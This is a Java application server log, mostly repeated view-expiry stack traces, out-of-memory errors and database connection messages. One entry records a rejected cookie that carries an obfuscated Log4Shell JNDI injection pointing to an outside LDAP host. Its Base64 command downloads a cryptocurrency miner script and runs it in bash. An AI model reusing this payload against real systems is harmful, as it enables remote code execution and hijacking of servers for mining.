22-Sep-2024 03:28:40.337 INFO [http-nio-8080-exec-17] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [MGLNDD_193.141.127.78_8080...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:418)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
22-Sep-2024 11:37:16.922 SEVERE [http-nio-8080-exec-2] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/index.xhtml - View /index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

22-Sep-2024 11:37:17.489 SEVERE [http-nio-8080-exec-14] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/index.xhtml - View /index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

22-Sep-2024 11:37:20.462 SEVERE [http-nio-8080-exec-6] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/index.xhtml - View /index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

22-Sep-2024 11:37:21.743 SEVERE [http-nio-8080-exec-10] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/index.xhtml - View /index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

22-Sep-2024 11:37:21.951 SEVERE [http-nio-8080-exec-8] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/index.xhtml - View /index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

22-Sep-2024 12:32:39.468 INFO [http-nio-8080-exec-10] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//89.34.230.11:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuNHRoZXBvb2wubG9sL3NldHVwXzR0aGVwb29sX21pbmVyLnNoIHwgTENfQUxMPWVuX1VTLlVURi04IGJhc2ggLXMgNDk5YTZMTXZhbVdjdXFuVzd3bU1oNWlmTDFWU3o5YzNZUXAyUGNiQURGUDRhcjZhZDVldlBWUmV3QmZGcUhIUE5YVzRvclZlQVUxcmFVek1lVmZCUVozdFRwOEtaTEo=}')] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
22-Sep-2024 13:48:44.334 INFO [http-nio-8080-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x040x010x00P0x000x000x000x010x00example.com...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:418)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
22-Sep-2024 20:39:22.039 INFO [http-nio-8080-exec-9] com.mongodb.diagnostics.logging.SLF4JLogger.info Opened connection [connectionId{localValue:8, serverValue:545}] to localhost:27017
22-Sep-2024 21:11:02.167 SEVERE [http-nio-8080-exec-2] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError java.lang.OutOfMemoryError: GC overhead limit exceeded

22-Sep-2024 21:12:01.717 SEVERE [http-nio-8080-exec-14] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError java.lang.OutOfMemoryError: GC overhead limit exceeded

22-Sep-2024 21:16:54.307 SEVERE [http-nio-8080-exec-12] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError java.lang.OutOfMemoryError: GC overhead limit exceeded

22-Sep-2024 23:54:32.138 INFO [http-nio-8080-exec-14] com.mongodb.diagnostics.logging.SLF4JLogger.info Opened connection [connectionId{localValue:9, serverValue:546}] to localhost:27017
